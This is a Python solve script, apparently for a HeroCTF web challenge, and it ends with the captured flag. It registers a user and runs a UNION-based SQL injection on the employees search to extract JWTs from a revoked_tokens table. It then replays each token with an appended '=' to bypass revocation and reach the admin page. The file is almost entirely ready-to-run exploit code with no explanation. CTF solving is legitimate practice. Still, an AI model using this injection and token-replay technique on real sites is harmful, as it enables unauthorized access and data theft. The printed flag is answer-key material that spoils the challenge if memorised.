import re

import requests

chal = "http://dyn12.heroctf.fr:11806"
s = requests.Session()

s.post(f"{chal}/register", data={"username": "x", "password": "x"})
s.post(f"{chal}/login", data={"username": "x", "password": "x"})

r = s.get(
    f"{chal}/employees",
    params={"query": "' UNION SELECT 1,token,3,4 FROM revoked_tokens--"},
)
tokens = re.findall(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", r.text)

for token in tokens:
    r = requests.get(
        f"{chal}/admin", cookies={"JWT": token + "="}, allow_redirects=False
    )
    if r.status_code == 200 and "Hero{" in r.text:
        print(re.search(r"Hero\{[^}]+\}", r.text).group())
        break

# Hero{N0t_th4t_r3v0k3d_ec6dcf0ae6ae239c4d630b2f5ccb51bb}
